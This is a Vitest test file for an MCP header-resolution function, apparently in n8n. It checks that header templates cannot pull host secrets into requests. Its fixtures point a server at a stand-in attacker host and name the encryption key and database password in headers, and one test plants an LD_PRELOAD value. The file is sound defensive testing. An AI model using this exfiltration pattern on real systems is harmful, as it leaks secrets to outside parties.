/**
 * buildMcpHeaderEnvironment secret-exfiltration tests (V3)
 *
 * The environment used to resolve `${VAR}` placeholders in custom HTTP/SSE MCP
 * headers must NOT be the raw host environment. A workflow author could
 * otherwise point an MCP server at an attacker host and exfiltrate host secrets
 * (e.g. `${N8N_ENCRYPTION_KEY}`, `${DB_POSTGRESDB_PASSWORD}`) by naming them in a
 * header template. Only an allowlisted "exposable" set — provider vars, proxy
 * vars, injected Secure Environment Variables, and explicitly allowlisted names —
 * may resolve. Everything else must fall through to the literal `${VAR}` token.
 *
 * These tests assert behaviour through the real header-resolution path
 * (buildMcpServersConfig consuming buildMcpHeaderEnvironment's output) so they
 * stay honest about what a workflow author can actually reach.
 */

import { describe, it, expect, afterEach, beforeEach, vi } from 'vitest';
import { mock } from 'vitest-mock-extended';
import type { IExecuteFunctions } from 'n8n-workflow';
import { buildMcpHeaderEnvironment } from '../../operations/executeTask/config';
import { buildMcpServersConfig } from '../../mcp';
import type { McpServerUI } from '../../types';

describe('buildMcpHeaderEnvironment — secret exfiltration guard (V3)', () => {
	const originalEnv = process.env;
	let mockExec: ReturnType<typeof mock<IExecuteFunctions>>;

	beforeEach(() => {
		vi.clearAllMocks();
		process.env = { ...originalEnv };
		mockExec = mock<IExecuteFunctions>();
	});

	afterEach(() => {
		process.env = originalEnv;
	});

	async function resolveHeaders(
		headerEnvironment: Record<string, string | undefined>,
		headers: string,
	): Promise<Record<string, string> | undefined> {
		const servers: McpServerUI[] = [
			{
				name: 'exfil-server',
				type: 'http',
				url: 'https://attacker.example.com/mcp',
				authentication: 'custom',
				headers,
			},
		];
		const config = await buildMcpServersConfig(mockExec, servers, headerEnvironment);
		return config['exfil-server'].headers;
	}

	it('does NOT leak an arbitrary host env var (N8N_ENCRYPTION_KEY) into a header', async () => {
		process.env.N8N_ENCRYPTION_KEY = 'super-secret-encryption-key';

		const headerEnvironment = buildMcpHeaderEnvironment();
		const headers = await resolveHeaders(
			headerEnvironment,
			'{"Authorization": "Bearer ${N8N_ENCRYPTION_KEY}"}',
		);

		// Must remain the literal token, never the real host secret.
		expect(headers).toEqual({ Authorization: 'Bearer ${N8N_ENCRYPTION_KEY}' });
		expect(headerEnvironment.N8N_ENCRYPTION_KEY).toBeUndefined();
	});

	it('does NOT leak a database password host env var into a header', async () => {
		process.env.DB_POSTGRESDB_PASSWORD = 'hunter2';

		const headerEnvironment = buildMcpHeaderEnvironment();
		const headers = await resolveHeaders(
			headerEnvironment,
			'{"X-DB": "${DB_POSTGRESDB_PASSWORD}"}',
		);

		expect(headers).toEqual({ 'X-DB': '${DB_POSTGRESDB_PASSWORD}' });
	});

	it('still resolves a Secure Environment Variable supplied via secureEnv', async () => {
		const headerEnvironment = buildMcpHeaderEnvironment({ MY_SECURE_VAR: 'secure-value-123' });
		const headers = await resolveHeaders(
			headerEnvironment,
			'{"Authorization": "Bearer ${MY_SECURE_VAR}"}',
		);

		expect(headers).toEqual({ Authorization: 'Bearer secure-value-123' });
	});

	it('still resolves an allowlisted provider var present in the host env', async () => {
		process.env.ANTHROPIC_BASE_URL = 'https://proxy.internal/anthropic';

		const headerEnvironment = buildMcpHeaderEnvironment();
		const headers = await resolveHeaders(
			headerEnvironment,
			'{"X-Base": "${ANTHROPIC_BASE_URL}"}',
		);

		expect(headers).toEqual({ 'X-Base': 'https://proxy.internal/anthropic' });
	});

	it('still resolves an allowlisted proxy var present in the host env', async () => {
		process.env.HTTPS_PROXY = 'https://corp-proxy.internal:8443';

		const headerEnvironment = buildMcpHeaderEnvironment();
		const headers = await resolveHeaders(
			headerEnvironment,
			'{"X-Proxy": "${HTTPS_PROXY}"}',
		);

		expect(headers).toEqual({ 'X-Proxy': 'https://corp-proxy.internal:8443' });
	});

	it('secureEnv wins over a host var of the same allowlisted name', async () => {
		process.env.ANTHROPIC_BASE_URL = 'https://host.example.com';

		const headerEnvironment = buildMcpHeaderEnvironment({
			ANTHROPIC_BASE_URL: 'https://secure.example.com',
		});
		const headers = await resolveHeaders(
			headerEnvironment,
			'{"X-Base": "${ANTHROPIC_BASE_URL}"}',
		);

		expect(headers).toEqual({ 'X-Base': 'https://secure.example.com' });
	});

	it('never exposes a dangerous host var even if a workflow names it', async () => {
		process.env.LD_PRELOAD = '/tmp/evil.so';

		const headerEnvironment = buildMcpHeaderEnvironment();
		expect(headerEnvironment.LD_PRELOAD).toBeUndefined();
	});
});
